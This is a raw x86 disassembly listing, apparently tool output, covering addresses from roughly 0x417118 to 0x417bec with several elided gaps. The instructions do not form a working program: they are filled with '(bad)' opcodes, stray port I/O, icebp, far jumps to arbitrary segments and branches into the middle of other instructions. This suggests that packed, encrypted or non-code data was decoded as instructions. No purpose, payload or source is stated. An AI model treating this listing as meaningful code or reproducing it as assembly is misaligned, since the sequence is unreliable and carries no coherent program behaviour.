  417118:	push   es
  417119:	pusha  
  41711a:	pop    ss
  41711b:	mov    edx,0x7b0c5acd
  417120:	ret    0xf600
  417123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417124:	xchg   BYTE PTR [edx+0x5003f762],dl
  41712a:	scas   eax,DWORD PTR es:[edi]
  41712b:	cmp    BYTE PTR [edi-0x2c],ch
  41712e:	pop    ebp
  41712f:	xor    ecx,edi
  417131:	scas   eax,DWORD PTR es:[edi]
  417132:	add    BYTE PTR [ecx-0x1c3e70dd],bh
  417138:	out    dx,al
  417139:	sub    DWORD PTR [ebx-0x3879d3be],ebp
  41713f:	mov    cl,0xb7
  417141:	jb     0x4170fe
  417143:	sub    eax,0x57f1e735
  417148:	inc    ebx
  417149:	in     eax,0xf9
  41714b:	cmp    BYTE PTR [ebx-0x4d0e3249],bh
  417151:	and    eax,edi
  417153:	mov    eax,ds:0x197b6d25
  417158:	push   ss
  417159:	jnp    0x41711b
  41715b:	in     al,0x70
  41715d:	cmp    eax,0xd5dd6a57
  417162:	inc    ebx
  417163:	out    dx,al
  417164:	sahf   
  417165:	repz push cs
  417167:	inc    edi
  417168:	and    DWORD PTR [eax+esi*4-0x4a],esp
  41716c:	xchg   ebx,eax
  41716d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41716e:	dec    ecx
  41716f:	stos   BYTE PTR es:[edi],al
  417170:	test   ebp,esp
  417172:	pop    eax
  417173:	icebp  
  417174:	mov    ebp,0xe33bbe51
  417179:	cdq    
  41717a:	(bad)  [edx]
  41717c:	mov    esi,0xbe48ddc1
  417181:	mov    edx,0x6a493e5a
  417186:	mov    cl,0x6d
  417188:	mov    eax,0xcc42e42b
  41718d:	stos   BYTE PTR es:[edi],al
  41718e:	mov    ah,0x48
  417190:	push   ds
  417191:	fiadd  DWORD PTR [edx+0x59e7660b]
  417197:	pop    ds
  417198:	push   0x62
  41719a:	mov    ebp,0x6b7ae93a
  41719f:	mov    eax,0x821b4f1d
  4171a4:	lods   al,BYTE PTR ds:[esi]
  4171a5:	pop    esp
  4171a6:	dec    edi
  4171a7:	push   eax
  4171a8:	pushf  
  4171a9:	or     esi,ebx
  4171ab:	lods   eax,DWORD PTR ds:[esi]
  4171ac:	adc    al,BYTE PTR [edx]
  4171ae:	mov    ds:0x46c2ff6d,al
  4171b3:	sub    eax,0xd3e856
  4171b8:	rcl    edi,cl
  4171ba:	scas   al,BYTE PTR es:[edi]
  4171bb:	(bad)  
  4171bc:	sti    
  4171bd:	dec    esp
  4171be:	std    
  4171bf:	adc    BYTE PTR es:[eax],al
	...
  417232:	add    BYTE PTR [eax],al
  417234:	and    ebp,DWORD PTR [esi+0x32]
  417237:	and    eax,0x6e377d7f
  41723c:	or     BYTE PTR [ebx-0x1b],dl
  41723f:	jmp    0x8414:0x66db
  417245:	cld    
  417246:	add    BYTE PTR [eax],al
  417248:	cmc    
  417249:	add    BYTE PTR [eax],al
  41724b:	add    BYTE PTR [edx+eax*2-0x56],dh
  41724f:	retf   0x7c2a
  417252:	sti    
  417253:	retf   0xadfd
  417256:	xor    eax,0xfc461c50
  41725b:	sbb    DWORD PTR [ebp+0x3e68ab66],0x77
  417262:	and    dl,BYTE PTR [edi-0x2c4f7851]
  417268:	inc    esp
  417269:	scas   al,BYTE PTR es:[edi]
  41726a:	jg     0x417263
  41726c:	fiadd  WORD PTR [eax+0x2f]
  41726f:	dec    ebx
  417270:	add    eax,0x1e329fd5
  417275:	loop   0x4172a0
  417277:	adc    esp,DWORD PTR [eax]
  417279:	mov    eax,es:0xa5e26fc1
  41727f:	neg    edx
  417281:	les    eax,FWORD PTR [ecx+0x4d]
  417284:	adc    DWORD PTR [eax+0x16],ebp
  417287:	mov    ch,0x16
  417289:	lahf   
  41728a:	jp     0x41725c
  41728c:	mov    ds:0x3da2f489,al
  417291:	out    0x8f,al
  417293:	fild   WORD PTR [ebx-0x8]
  417296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417297:	push   cs
  417298:	xor    eax,DWORD PTR [edi-0x2457629]
  41729e:	je     0x41722a
  4172a0:	push   eax
  4172a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172a2:	xchg   ebp,eax
  4172a3:	mov    edx,0x2f94bb1c
  4172a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172a9:	scas   al,BYTE PTR es:[edi]
  4172aa:	pop    ebx
  4172ab:	shr    ah,0x22
  4172ae:	(bad)
  4172b2:	lods   al,BYTE PTR ds:[esi]
  4172b3:	imul   ebx,DWORD PTR [esi+0x32b485b3],0xbd02b76c
  4172bd:	jnp    0x4172f0
  4172bf:	mov    ah,0x66
  4172c1:	push   0x2520706d
  4172c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172c7:	hlt    
  4172c8:	lock pop edi
  4172ca:	pop    es
  4172cb:	dec    edx
  4172cc:	fs ret 0x242d
  4172d0:	lods   eax,DWORD PTR ds:[esi]
  4172d1:	cmp    ch,BYTE PTR [ecx]
  4172d3:	sar    DWORD PTR [esi-0x355ecfbd],1
  4172d9:	rcr    BYTE PTR [ecx+0x56],cl
  4172dc:	ins    BYTE PTR es:[edi],dx
  4172dd:	es (bad) 
  4172df:	(bad)  
  4172e0:	sub    al,0xe3
  4172e2:	mov    ah,0xba
  4172e4:	xor    ch,BYTE PTR [edi+0x21]
  4172e7:	mov    ds:0x8e6aa755,eax
  4172ec:	jo     0x41728e
  4172ee:	jmp    0x45858112
  4172f3:	jns    0x41731e
  4172f5:	mov    ebx,0x2e0f8b46
  4172fa:	dec    ebx
  4172fb:	out    dx,eax
  4172fc:	neg    cl
  4172fe:	mov    eax,0xa580f7a1
  417303:	sub    DWORD PTR [edi+0x55bec145],edi
  417309:	test   eax,0x9f48a587
  41730e:	popa   
  41730f:	xchg   esi,eax
  417310:	stos   DWORD PTR es:[edi],eax
  417311:	lods   eax,DWORD PTR ds:[esi]
  417312:	mov    ds:0x936c6d16,al
  417317:	add    eax,0xdce3031c
  41731c:	cmc    
  41731d:	cmp    ebx,DWORD PTR [edx-0x35ac7307]
  417323:	test   DWORD PTR [eax+0x20a90d71],0x966d08b3
  41732d:	loope  0x4173a7
  41732f:	pop    es
  417330:	retf   
  417331:	addr16 inc eax
  417333:	gs sub edx,0xfffffff6
  417337:	mov    ds:0x4d540ff7,eax
  41733c:	test   BYTE PTR [ecx-0x22],dl
  41733f:	lods   al,BYTE PTR ds:[esi]
  417340:	sub    al,BYTE PTR [eax]
	...
  4173b2:	add    BYTE PTR [eax],al
  4173b4:	repz inc ebx
  4173b6:	ror    cl,1
  4173b8:	lock (bad) 
  4173bb:	jnp    0x4173cb
  4173bd:	jmp    0x41733f
  4173bf:	sbb    al,0x6d
  4173c1:	outs   dx,DWORD PTR ds:[esi]
  4173c2:	mov    al,ds:0xfd792b
  4173c7:	add    ch,dh
  4173c9:	add    BYTE PTR [eax],al
  4173cb:	add    al,dh
  4173cd:	lahf   
  4173ce:	mov    bh,0x24
  4173d0:	mov    edi,0x7153153e
  4173d5:	sbb    WORD PTR ds:0xf88bc289,si
  4173dc:	jp     0x417371
  4173de:	jbe    0x4173c5
  4173e0:	ins    DWORD PTR es:[edi],dx
  4173e1:	in     eax,0xd8
  4173e3:	pop    ebx
  4173e4:	cmp    BYTE PTR [ebx-0x1e7610e1],dl
  4173ea:	shl    BYTE PTR [edx-0x554e9701],1
  4173f0:	push   esp
  4173f1:	aas    
  4173f2:	add    edi,DWORD PTR [edx+0x10e76b2]
  4173f8:	cmp    BYTE PTR [ecx+eax*8+0x69],bl
  4173fc:	cmp    al,0x51
  4173fe:	mov    dl,0xee
  417400:	dec    BYTE PTR [ecx+0x68]
  417403:	xlat   BYTE PTR ds:[ebx]
  417404:	cli    
  417405:	jno    0x41738b
  417407:	(bad)  
  417408:	push   ss
  417409:	mov    esp,0x75c85d6d
  41740e:	call   0xd81a:0x9d32f9f2
  417415:	push   ecx
  417416:	movlps xmm0,QWORD PTR [ebx-0x103b80db]
  41741d:	stc    
  41741e:	or     al,0xd7
  417420:	xchg   esi,eax
  417421:	sbb    eax,0xc420c48e
  417426:	jg     0x4173d7
  417428:	dec    ebx
  417429:	call   0x15dc:0x784b437c
  417430:	xchg   esi,eax
  417431:	add    bh,dh
  417433:	ror    BYTE PTR [ebp+esi*2-0x25],0x60
  417438:	push   esi
  417439:	pop    ebx
  41743a:	xchg   edi,eax
  41743b:	mov    DWORD PTR [ebx],edi
  41743d:	and    ecx,DWORD PTR [edx-0x6805ff13]
  417443:	jge    0x41741a
  417445:	cmc    
  417446:	push   es
  417447:	cld    
  417448:	in     eax,0x4f
  41744a:	ins    DWORD PTR es:[edi],dx
  41744b:	rcr    DWORD PTR [ebx+0x73e6eb84],0xc1
  417452:	or     BYTE PTR [ebp+0xa],0xe5
  417456:	idiv   DWORD PTR [edx-0xf2e25b]
  41745c:	pop    esi
  41745d:	cld    
  41745e:	mov    ecx,0x2a6b1dcc
  417463:	inc    edi
  417464:	popa   
  417465:	call   0x69b84a05
  41746a:	pop    esp
  41746b:	loopne 0x4174a4
  41746d:	test   eax,0xc8becf74
  417472:	xor    DWORD PTR [edx],edi
  417474:	and    al,0xa2
  417476:	(bad)  
  417477:	fstp   st(7)
  417479:	sti    
  41747a:	mov    ch,0x6
  41747c:	shr    BYTE PTR [eax+edi*2],0x13
  417480:	outs   dx,DWORD PTR ds:[esi]
  417481:	pop    ecx
  417482:	lods   al,BYTE PTR ds:[esi]
  417483:	pop    eax
  417484:	addr16 fadd st(7),st
  417487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417488:	mov    edx,0xd0d5ac8b
  41748d:	js     0x417442
  41748f:	mov    dl,0x20
  417491:	mov    edi,0x579d7a46
  417496:	or     al,0x7d
  417498:	arpl   WORD PTR [ebp-0x7e82413e],dx
  41749e:	outs   dx,DWORD PTR ds:[esi]
  41749f:	je     0x4174fb
  4174a1:	fwait
  4174a2:	int3   
  4174a3:	int3   
  4174a4:	adc    DWORD PTR [esi+0x70],edx
  4174a7:	adc    BYTE PTR [edx],ah
  4174a9:	xchg   ebx,eax
  4174aa:	jge    0x417441
  4174ac:	dec    edx
  4174ad:	or     eax,0x51bdcd0b
  4174b2:	js     0x4174cc
  4174b4:	cmp    DWORD PTR [ecx+0xc24a42b],esp
  4174ba:	iret   
  4174bb:	and    BYTE PTR [ebp+0x2fc90c2d],0x0
	...
  417532:	add    BYTE PTR [eax],al
  417534:	and    eax,0xfff32bd8
  417539:	repz std 
  41753b:	fimul  WORD PTR [edx]
  41753d:	mov    edi,0x68fd3b7a
  417542:	idiv   DWORD PTR [ecx+0xfe6e]
  417548:	cmc    
  417549:	add    BYTE PTR [eax],al
  41754b:	add    dl,bh
  41754d:	inc    ecx
  41754e:	lods   al,BYTE PTR ds:[esi]
  41754f:	cdq    
  417550:	ss jae 0x417576
  417553:	push   edx
  417554:	jle    0x41758d
  417556:	pop    esp
  417557:	sub    esi,DWORD PTR [ebx+0x7d2af5ee]
  41755d:	xchg   ecx,eax
  41755e:	int    0xed
  417560:	add    BYTE PTR [ebx+ebx*4-0x2fe11290],0x52
  417568:	test   DWORD PTR [ebx],ebx
  41756a:	mov    al,0x8e
  41756c:	push   edi
  41756d:	cld    
  41756e:	cmp    BYTE PTR [ecx+0x5ff26cbe],0xe6
  417575:	xchg   esi,eax
  417576:	(bad)
  41757a:	fidiv  DWORD PTR [edi+0x64]
  41757d:	pop    es
  41757e:	cdq    
  41757f:	xchg   esi,eax
  417580:	dec    esp
  417581:	sti    
  417582:	lea    ecx,[edi+0x61]
  417585:	sub    BYTE PTR [ecx],0x7b
  417588:	add    eax,0x52971d74
  41758d:	lock mov dh,dl
  417590:	ret    0x71e5
  417593:	dec    ebx
  417594:	push   ebp
  417595:	ficom  DWORD PTR ds:0x397b37f1
  41759b:	mov    edi,0x8045842f
  4175a0:	inc    ebx
  4175a1:	push   0x1f
  4175a3:	pop    edi
  4175a4:	sti    
  4175a5:	enter  0x3917,0x3
  4175a9:	and    bl,bl
  4175ab:	les    esp,FWORD PTR [edi+edx*8+0x49d11872]
  4175b2:	mov    dl,0xfb
  4175b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175b5:	xchg   esi,eax
  4175b6:	inc    ebx
  4175b7:	push   DWORD PTR ds:0xdd7b9022
  4175bd:	cmp    al,0x32
  4175bf:	mov    ebx,0xe5bf183d
  4175c4:	xor    BYTE PTR [esi-0x29],0xf
  4175c8:	dec    ebx
  4175c9:	les    esi,FWORD PTR [edx+esi*1]
  4175cc:	or     eax,0x63ac6920
  4175d1:	test   DWORD PTR [ebx-0x1b],eax
  4175d4:	cwde   
  4175d5:	shr    DWORD PTR [eax+ebp*2-0x43],0xce
  4175da:	mov    bl,0x9
  4175dc:	add    eax,0x4bf7ef0f
  4175e1:	out    0x5b,eax
  4175e3:	or     al,0xb0
  4175e5:	cli    
  4175e6:	xchg   BYTE PTR [eax+0x4ab78b71],al
  4175ec:	xor    bh,BYTE PTR [ebp-0x53476b7e]
  4175f2:	out    dx,al
  4175f3:	scas   al,BYTE PTR es:[edi]
  4175f4:	jle    0x417631
  4175f6:	jmp    0xd73e9263
  4175fb:	cli    
  4175fc:	(bad)  
  4175fd:	cmp    dh,BYTE PTR [ebp-0x3f838ff4]
  417603:	sub    BYTE PTR [ebx],al
  417605:	xor    dl,cl
  417607:	jp     0x4175a7
  417609:	loope  0x4175f8
  41760b:	mov    bl,0x73
  41760d:	push   0x1bc717c6
  417612:	jp     0x417635
  417614:	in     al,0x39
  417616:	(bad)  
  417617:	stos   DWORD PTR es:[edi],eax
  417618:	push   0x25
  41761a:	mov    eax,0xe48786d4
  41761f:	js     0x4175aa
  417621:	mov    ecx,0xcdad22f8
  417626:	mov    al,ds:0x52dfebb
  41762b:	xchg   ebx,eax
  41762c:	aam    0x5e
  41762e:	xlat   BYTE PTR ds:[ebx]
  41762f:	pop    ds
  417630:	xor    DWORD PTR [edx],eax
  417632:	push   ebp
  417633:	mov    al,ds:0xd5768cd4
  417638:	dec    eax
  417639:	pop    ebp
  41763a:	test   DWORD PTR [ecx],0x3af91425
	...
  4176b4:	(bad)  
  4176b5:	(bad)  
  4176b7:	(bad)  
  4176b8:	(bad)  
  4176ba:	out    0xff,eax
  4176bc:	xchg   BYTE PTR [eax],dh
  4176be:	jns    0x4176dd
  4176c0:	add    eax,0x63539113
  4176c5:	inc    DWORD PTR [eax]
  4176c7:	add    ch,dh
  4176c9:	add    BYTE PTR [eax],al
  4176cb:	add    BYTE PTR [eax+0x38],dl
  4176ce:	xchg   edx,eax
  4176cf:	hlt    
  4176d0:	aam    0x70
  4176d2:	fwait
  4176d3:	sub    DWORD PTR [ecx+0x78],edi
  4176d6:	inc    esp
  4176d7:	out    0x11,eax
  4176d9:	or     DWORD PTR [edx],esi
  4176db:	(bad)
  4176de:	repnz sar DWORD PTR [ecx-0x5bcdc50e],cl
  4176e5:	mov    WORD PTR [esi-0xce2cd6b],cs
  4176eb:	imul   edx,DWORD PTR [ebp+0x3e],0xeb739e81
  4176f2:	cdq    
  4176f3:	inc    esi
  4176f4:	pop    edx
  4176f5:	add    BYTE PTR [eax-0x543c99af],0xda
  4176fc:	push   eax
  4176fd:	mov    DWORD PTR [edi],ebp
  4176ff:	into   
  417700:	ret    
  417701:	addr16 popa 
  417703:	sbb    eax,0x9900348f
  417708:	lea    ecx,[ebx+0x65326c21]
  41770e:	inc    ebp
  41770f:	dec    edi
  417710:	repz xchg esi,eax
  417712:	sbb    BYTE PTR [ebp+0x78e50396],cl
  417718:	cmc    
  417719:	cdq    
  41771a:	cli    
  41771b:	outs   dx,DWORD PTR ds:[esi]
  41771c:	xor    al,0x5c
  41771e:	mov    ds:0xaa0d4df7,eax
  417723:	and    ebp,DWORD PTR [edx-0x58854651]
  417729:	push   esp
  41772a:	outs   dx,BYTE PTR ds:[esi]
  41772b:	inc    edi
  41772c:	cdq    
  41772d:	jmp    0x24efb59c
  417732:	retf   
  417733:	mov    ds:0xc90d06da,eax
  417738:	mov    ebx,0x23c1bd4d
  41773d:	dec    ebp
  41773e:	mov    al,ds:0x49d88023
  417743:	jbe    0x4177a7
  417745:	and    BYTE PTR [edi-0x21bd21c9],cl
  41774b:	es pushf 
  41774d:	ror    DWORD PTR [eax-0x12],1
  417750:	jns    0x417739
  417752:	cld    
  417753:	imul   ebx,DWORD PTR [esi+0x57],0x87228334
  41775a:	pushf  
  41775b:	inc    bp
  41775d:	or     eax,0x76791a1e
  417762:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417763:	mov    edx,0x141974f4
  417768:	hlt    
  417769:	dec    esp
  41776a:	daa    
  41776b:	xor    ebx,DWORD PTR [edx-0x78]
  41776e:	dec    esp
  41776f:	je     0x417750
  417771:	bound  esi,QWORD PTR [edx]
  417773:	add    esi,DWORD PTR [edx+0x2a]
  417776:	(bad)  
  417778:	or     al,0x5
  41777a:	popf   
  41777b:	into   
  41777c:	pushf  
  41777d:	sbb    ch,BYTE PTR [ecx+ecx*4+0x2ed332b3]
  417784:	dec    ebx
  417785:	out    0xa1,al
  417787:	push   edi
  417788:	xchg   ebp,eax
  417789:	add    DWORD PTR [ecx+ecx*2+0x36],esi
  41778d:	mov    dh,0x5a
  41778f:	call   FWORD PTR [esi-0x43]
  417792:	cmp    BYTE PTR [ebx],al
  417794:	pushf  
  417795:	neg    DWORD PTR [edi+eax*8+0x109294ad]
  41779c:	dec    esi
  41779d:	pop    ebp
  41779e:	data16 sub BYTE PTR [eax+ebp*8+0x3609afc0],dl
  4177a6:	shl    BYTE PTR [eax+0x3a1c17cf],cl
  4177ac:	fnstsw WORD PTR [edx+ebx*8-0x4b]
  4177b0:	jns    0x417745
  4177b2:	cmp    bl,BYTE PTR [edi-0x1c]
  4177b5:	aam    0xcc
  4177b7:	pusha  
  4177b8:	mov    dh,0x3c
  4177ba:	enter  0xbf50,0x6f
  4177be:	stc    
  4177bf:	inc    ebx
  4177c0:	adc    eax,DWORD PTR [eax]
	...
  417832:	add    BYTE PTR [eax],al
  417834:	shr    DWORD PTR [edi-0x4810cfa],1
  41783a:	cmc    
  41783b:	scas   eax,DWORD PTR es:[edi]
  41783c:	mov    ebx,0xe87d6e99
  417841:	aad    0x3c
  417843:	jb     0x41789d
  417845:	add    BYTE PTR [ecx],al
  417847:	add    ch,dh
  417849:	add    BYTE PTR [eax],al
  41784b:	add    BYTE PTR [ecx],cl
  41784d:	aam    0x8f
  41784f:	cli    
  417850:	xchg   ebx,eax
  417851:	mov    BYTE PTR ds:0xf1e955a0,dl
  417857:	into   
  417858:	xor    DWORD PTR [esi+0x3e],edx
  41785b:	into   
  41785c:	pop    esi
  41785d:	or     al,0x80
  41785f:	add    ch,al
  417861:	out    dx,al
  417862:	sbb    DWORD PTR [ebx-0x4e4bef80],esp
  417868:	jl     0x417811
  41786a:	xor    DWORD PTR [edx+0x7d],ebp
  41786d:	cmc    
  41786e:	mov    edx,0x75c8a26a
  417873:	pop    edi
  417874:	sti    
  417875:	stc    
  417876:	jle    0x417898
  417878:	icebp  
  417879:	and    BYTE PTR [edi+edx*2],ah
  41787c:	push   ecx
  41787d:	std    
  41787e:	push   cs
  41787f:	or     dl,BYTE PTR [ebx]
  417881:	adc    esi,DWORD PTR [ecx+0x64a3dcfc]
  417887:	in     eax,dx
  417888:	inc    ebx
  417889:	outs   dx,DWORD PTR ds:[esi]
  41788a:	jecxz  0x41781d
  41788c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41788d:	(bad)  
  41788e:	xor    ecx,DWORD PTR ds:0x9b69940
  417894:	mov    ebx,edx
  417896:	dec    esi
  417897:	pop    es
  417898:	jmp    0xc30f9017
  41789d:	mov    eax,ds:0xc63fbda7
  4178a2:	in     al,0x26
  4178a4:	in     eax,0x2f
  4178a6:	or     al,0xda
  4178a8:	mov    ecx,0x4f8aa6c7
  4178ad:	mov    ah,0xc6
  4178af:	lock push ebp
  4178b1:	and    al,bl
  4178b3:	ss pop edi
  4178b5:	mov    esp,0x7453cc28
  4178ba:	pop    ds
  4178bb:	shr    BYTE PTR [edi],1
  4178bd:	repz cwde 
  4178bf:	ficom  DWORD PTR [edi+0x16]
  4178c2:	cld    
  4178c3:	test   eax,0x714fc722
  4178c8:	bound  ebp,QWORD PTR [ebp-0x4e]
  4178cb:	fdiv   st(1),st
  4178cd:	fcomp  QWORD PTR [ecx+ebx*8+0x17]
  4178d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178d2:	inc    edi
  4178d3:	int    0x22
  4178d5:	inc    eax
  4178d6:	pusha  
  4178d7:	aaa    
  4178d8:	mov    fs,esp
  4178da:	sub    DWORD PTR [ecx+0x55],0xfa681eb2
  4178e1:	lds    ebx,FWORD PTR [eax]
  4178e3:	in     eax,0xec
  4178e5:	lods   al,BYTE PTR ds:[esi]
  4178e6:	push   edx
  4178e7:	push   eax
  4178e8:	fild   DWORD PTR ds:0x23f2f198
  4178ee:	nop
  4178ef:	xor    ecx,DWORD PTR [edx]
  4178f1:	sbb    al,0x2
  4178f3:	and    edx,DWORD PTR [ebx-0x37]
  4178f6:	mov    cl,0x64
  4178f8:	cld    
  4178f9:	es (bad) 
  4178fb:	ins    DWORD PTR es:[edi],dx
  4178fc:	es mov ah,0x42
  4178ff:	or     BYTE PTR [ebx-0x1c],ah
  417902:	adc    DWORD PTR [esi+0x2],esp
  417905:	loope  0x41796f
  417907:	rol    BYTE PTR [edx-0x562682e6],0x16
  41790e:	aas    
  41790f:	xlat   BYTE PTR ds:[ebx]
  417910:	and    al,0xb9
  417912:	loop   0x41797e
  417914:	pusha  
  417915:	hlt    
  417916:	scas   al,BYTE PTR es:[edi]
  417917:	mov    eax,0xb5339e9c
  41791c:	add    DWORD PTR [ebp+0x2a0b537a],edx
  417922:	into   
  417923:	or     ah,BYTE PTR [edx-0x11]
  417926:	push   es
  417927:	pop    ebx
  417928:	dec    ecx
  417929:	int3   
  41792a:	mov    ds:0xddac5a97,eax
  41792f:	cmp    edx,DWORD PTR [ebx-0x53e7b1aa]
  417935:	xchg   ebx,eax
  417936:	sub    al,0x8
  417938:	xchg   BYTE PTR [ebp-0x67ea3588],cl
  41793e:	and    BYTE PTR [eax-0x7d],bh
	...
  4179b1:	add    BYTE PTR [eax],al
  4179b3:	add    bl,cl
  4179b5:	pusha  
  4179b6:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  4179bc:	lea    esi,[esi+0x413ec980]
  4179c2:	sbb    edi,DWORD PTR [edi]
  4179c4:	dec    ebp
  4179c5:	add    DWORD PTR [ecx],eax
  4179c7:	add    ch,dh
  4179c9:	add    BYTE PTR [eax],al
  4179cb:	add    BYTE PTR [ebx+ebp*1+0x50],cl
  4179cf:	jmp    0x886eaf02
  4179d4:	cli    
  4179d5:	fstp   DWORD PTR ds:0xed98cfa4
  4179db:	mov    ebx,0xdebc3ea6
  4179e0:	mov    ds:0xb406ef66,eax
  4179e5:	sar    DWORD PTR [esi],cl
  4179e7:	out    dx,eax
  4179e8:	xchg   DWORD PTR fs:[ecx-0x283ca1c5],edx
  4179ef:	and    ecx,DWORD PTR [edx+0x3d]
  4179f2:	or     al,0x5
  4179f4:	jecxz  0x4179fe
  4179f6:	sti    
  4179f7:	mov    ecx,0x121c8ae9
  4179fc:	xchg   edi,eax
  4179fd:	fmul   DWORD PTR [esi-0x18]
  417a00:	and    al,0xef
  417a02:	fistp  QWORD PTR [ebp+0x4f]
  417a05:	push   cs
  417a06:	push   ebx
  417a07:	xchg   ebp,eax
  417a08:	mov    dl,0x5b
  417a0a:	pusha  
  417a0b:	into   
  417a0c:	cmp    al,0x22
  417a0e:	mov    ds:0x46578a32,al
  417a13:	clc    
  417a14:	mov    esi,0xfd084c9a
  417a19:	fwait
  417a1a:	lods   al,BYTE PTR ds:[esi]
  417a1b:	add    eax,DWORD PTR [eax+0x6f]
  417a1e:	xor    ch,BYTE PTR [ebx]
  417a20:	jl     0x4179d9
  417a22:	fs mov gs:0x7d09074,eax
  417a29:	xchg   edx,eax
  417a2a:	fist   DWORD PTR [ebx-0x69]
  417a2d:	out    0x89,eax
  417a2f:	or     ebx,esp
  417a31:	add    DWORD PTR [esi],ebp
  417a33:	lock adc ah,dl
  417a36:	ror    bl,1
  417a38:	xor    al,0xe
  417a3a:	pop    edx
  417a3b:	(bad)  
  417a3c:	cmp    ch,bl
  417a3e:	xchg   edi,eax
  417a3f:	xor    ch,BYTE PTR [ebx-0x2]
  417a42:	adc    BYTE PTR [ebx],al
  417a44:	in     al,0x75
  417a46:	fnstcw WORD PTR [eax+0x532beb7f]
  417a4c:	mov    ah,0xd4
  417a4e:	dec    ebp
  417a4f:	xchg   DWORD PTR ds:0xbc422c95,esp
  417a55:	pop    ebx
  417a56:	fist   DWORD PTR [ebx+ebx*2-0x66d8e20]
  417a5d:	ds stc 
  417a5f:	dec    edi
  417a60:	jnp    0x417a8d
  417a62:	mov    ecx,0xb585eb14
  417a67:	fnstcw WORD PTR [esi+0x59]
  417a6a:	push   ds
  417a6b:	pop    edx
  417a6c:	sub    DWORD PTR [edx+0x12],edx
  417a6f:	xchg   esp,eax
  417a70:	xchg   ebx,eax
  417a71:	add    eax,0x6b593e6f
  417a76:	retf   
  417a77:	cli    
  417a78:	into   
  417a79:	adc    eax,0xac95f532
  417a7e:	mov    ch,0xd9
  417a80:	push   edi
  417a81:	inc    edx
  417a82:	cdq    
  417a83:	hlt    
  417a84:	daa    
  417a85:	inc    esi
  417a86:	outs   dx,DWORD PTR ds:[esi]
  417a87:	sub    cl,BYTE PTR [edi+0x2e]
  417a8a:	xor    cl,ch
  417a8c:	dec    esp
  417a8d:	pop    eax
  417a8e:	das    
  417a8f:	loope  0x417acf
  417a91:	push   esi
  417a92:	jb     0x417ad2
  417a94:	cld    
  417a95:	xchg   edi,eax
  417a96:	div    BYTE PTR [ebp+0x54]
  417a99:	shr    BYTE PTR [esi+eax*2],cl
  417a9c:	aam    0xcd
  417a9e:	sbb    ax,0x974
  417aa2:	out    dx,eax
  417aa3:	lahf   
  417aa4:	jb     0x417a95
  417aa6:	push   es
  417aa7:	add    DWORD PTR [eax+0x7c],edx
  417aaa:	popf   
  417aab:	aad    0x1c
  417aad:	xor    BYTE PTR [ecx+0x37],ch
  417ab0:	or     al,0x5f
  417ab2:	lea    ebx,[edi-0x12]
  417ab5:	ror    DWORD PTR [ecx-0x6afb4f09],cl
  417abb:	(bad)  
  417abd:	sub    eax,0x820545
	...
  417b32:	add    BYTE PTR [eax],al
  417b34:	jecxz  0x417b9b
  417b36:	push   cs
  417b37:	test   DWORD PTR [esi+0x6a75fbff],0xf3fef5f7
  417b41:	xchg   esp,eax
  417b42:	cmp    BYTE PTR [edx+eax*2],bl
  417b45:	add    al,BYTE PTR [ecx]
  417b47:	add    ch,dh
  417b49:	add    BYTE PTR [eax],al
  417b4b:	add    bl,bh
  417b4d:	in     al,dx
  417b4e:	xor    esi,DWORD PTR [edx]
  417b50:	clc    
  417b51:	div    edx
  417b53:	and    eax,0xc1d4c7f7
  417b58:	mov    ebp,0xd8f6b803
  417b5d:	test   eax,0x6b5006a1
  417b62:	sub    ch,BYTE PTR [eax+0x1f]
  417b65:	add    eax,edi
  417b67:	sub    BYTE PTR fs:[esi+0x62],dl
  417b6b:	push   ebx
  417b6c:	ret    
  417b6d:	pusha  
  417b6e:	pop    ecx
  417b6f:	mov    ebx,0x4b045ddd
  417b74:	ret    
  417b75:	pop    esp
  417b76:	inc    edx
  417b77:	xchg   edi,eax
  417b78:	pop    ebp
  417b79:	rcl    BYTE PTR [ebp+0x5a],0x6e
  417b7d:	cld    
  417b7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b7f:	mov    al,ds:0xa8e4d675
  417b84:	and    esi,DWORD PTR [ecx-0x3a]
  417b87:	mov    bh,ch
  417b89:	push   cs
  417b8a:	jb     0x417bdf
  417b8c:	sbb    eax,0x5611655d
  417b91:	mov    cs,WORD PTR [esi+edi*8]
  417b94:	inc    esi
  417b95:	jnp    0x417c13
  417b97:	cld    
  417b98:	pop    esp
  417b99:	cld    
  417b9a:	mov    cl,0xa1
  417b9c:	push   esp
  417b9d:	sub    BYTE PTR [eax],cl
  417b9f:	das    
  417ba0:	xchg   BYTE PTR [esi-0x56283adb],ah
  417ba6:	dec    esp
  417ba7:	(bad)  
  417ba8:	mov    DWORD PTR [edi],ecx
  417baa:	sub    BYTE PTR [ebx-0x80],ah
  417bad:	push   0xffffff91
  417baf:	mov    bl,0x7
  417bb1:	push   edx
  417bb2:	and    dh,BYTE PTR [eax+0x2008723c]
  417bb8:	data16 stos BYTE PTR es:[edi],al
  417bba:	adc    eax,0x125ca13e
  417bbf:	sbb    DWORD PTR [eax],esi
  417bc1:	sub    DWORD PTR [ecx],esi
  417bc3:	mov    ecx,DWORD PTR [ecx+0x7a]
  417bc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bc7:	or     DWORD PTR [eax+0x1568642e],esp
  417bcd:	cs cli 
  417bcf:	dec    edi
  417bd0:	dec    edx
  417bd1:	and    DWORD PTR [ecx+ebp*2-0x2f],esp
  417bd5:	icebp  
  417bd6:	dec    esi
  417bd7:	xchg   ebp,eax
  417bd8:	imul   ebp,eax,0x4772e9d6
  417bde:	stos   BYTE PTR es:[edi],al
  417bdf:	rcr    DWORD PTR [edi],0x13
  417be2:	je     0x417c29
  417be4:	rcl    DWORD PTR [edi-0x5f9ddcc4],cl
  417bea:	jecxz  0x417b8c
  417bec:	mov    ebx,0x1355c444
